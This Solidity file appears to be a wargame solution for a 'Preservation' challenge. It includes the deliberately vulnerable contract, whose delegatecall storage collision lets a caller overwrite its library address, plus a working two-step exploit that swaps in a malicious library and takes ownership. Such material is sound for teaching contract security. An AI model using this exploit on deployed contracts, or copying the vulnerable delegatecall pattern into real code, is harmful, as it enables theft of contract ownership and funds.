// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Preservation {
    // public library contracts
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint storedTime;
    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    constructor(
        address _timeZone1LibraryAddress,
        address _timeZone2LibraryAddress
    ) {
        timeZone1Library = _timeZone1LibraryAddress;
        timeZone2Library = _timeZone2LibraryAddress;
        owner = msg.sender;
    }

    // set the time for timezone 1
    function setFirstTime(uint _timeStamp) public {
        timeZone1Library.delegatecall(
            abi.encodePacked(setTimeSignature, _timeStamp)
        );
    }

    // set the time for timezone 2
    function setSecondTime(uint _timeStamp) public {
        timeZone2Library.delegatecall(
            abi.encodePacked(setTimeSignature, _timeStamp)
        );
    }
}

// Simple library contract to set the time
contract LibraryContract {
    // stores a timestamp
    uint storedTime;

    function setTime(uint _time) public {
        storedTime = _time;
    }
}

// Attack preservation by changing the library address
// and then calilng the setFirstTime function
// on the malicious library contract
contract MaliciousLibrary {
    // Mimic Preservations storage
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint storedTime;

    function setTime(uint _time) public {
        // Do something malicious
        owner = tx.origin;
    }
}

contract PreservationAttack {
    MaliciousLibrary public maliciousLibrary;
    Preservation public preservation;

    constructor(Preservation _preservation) {
        maliciousLibrary = new MaliciousLibrary();
        preservation = _preservation;
        changeLibrary();
        attack();
    }

    function changeLibrary() public {
        preservation.setFirstTime(uint160(address(maliciousLibrary)));
    }

    function attack() public {
        preservation.setFirstTime(1);
    }
}
